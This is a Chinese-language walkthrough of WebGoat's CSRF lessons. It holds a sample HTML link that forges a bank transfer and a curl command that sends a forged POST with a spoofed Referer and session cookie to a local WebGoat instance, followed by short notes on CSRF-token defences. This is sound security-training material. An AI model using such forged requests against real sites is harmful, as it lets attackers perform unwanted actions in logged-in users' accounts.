# Cross-Site Request Forgeries

跨站请求伪造。利用网站对用户身份的信任，使得用户发送请求给服务器。需要依赖用户已经登录网站的事实。比如下面的例子:

``` html
<a href="http://bank.com/transfer?account_number_from=123456789&account_number_to=987654321&amount=100000">
View my Pictures!
</a>
```

## Task 1
仅仅是一个例子，展示了最基本的 Get 的 CSRF 的过程。

## Task 2
构造一个从其他 Referer 发送的伪造请求即可。利用 Curl 即可:

``` zsh
> curl -H "Referer: http://baidu.com/" -H "Cookie: JSESSIONID=39AF1A14DA2C67D6D759ED87A2687D7C" -d "reviewText=123&stars=123&validateReq=2aa14227b9a13d0bede0388a7fba9aa9" http://127.0.0.1:8080/WebGoat/csrf/review HTTP/1.1

{
  "lessonCompleted" : true,
  "feedback" : "It appears you have submitted correctly from another site. Go reload and see if your post is there.",
  "output" : null
}curl: (6) Could not resolve host: HTTP
```

## 防止 CSRF

很多框架有自动防止 CSRF 的措施，例如设置 CSRF-Token。注意要使用分开的 Cookie，而不要和 SessionId 等混用。

另外，自定义 Header 并不可靠。即便是规定 Content-type 也不可靠。

## Task 3

参考 [http://pentestmonkey.net/blog/csrf-xml-post-request](http://pentestmonkey.net/blog/csrf-xml-post-request)

由于请求中传递参数，需要将类型改成 plain 类型。而后进行船体。参见 `index.html` 即可拿到 flag。

## Task 4

非常奇怪，注册一个新账户，然后点击按钮就过了。大概就是体验一下 CSRF 攻击吧。
